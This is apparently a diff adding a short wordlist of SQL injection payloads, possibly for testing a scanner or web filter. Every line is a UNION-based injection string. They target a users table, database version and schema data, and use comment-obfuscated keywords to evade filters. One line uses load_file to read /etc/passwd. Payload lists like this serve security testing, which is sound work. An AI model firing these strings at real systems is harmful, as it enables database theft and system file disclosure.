@@ -1,0 +1,10 @@
+1 UNI/**/ON SELECT ALL FROM WHERE
+UNION ALL SELECT *, NULL, NULL FROM users
+'1' union (select id from users limit 1,1)
+1 union (select id from users limit 1,1)
+1 UNION SELECT 1 FROM information_schema.tables
+@version union (select id from users limit 1,1)
+' union (select @@version) --
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+1 /*!00000UNION*/ SeLeCt 1111,load_file('/etc/passwd'),3333,4444,5555,6666,7777,8888,9999,1010010,11111111,12121212 from mysql.user --
+1 union select 1,2,3
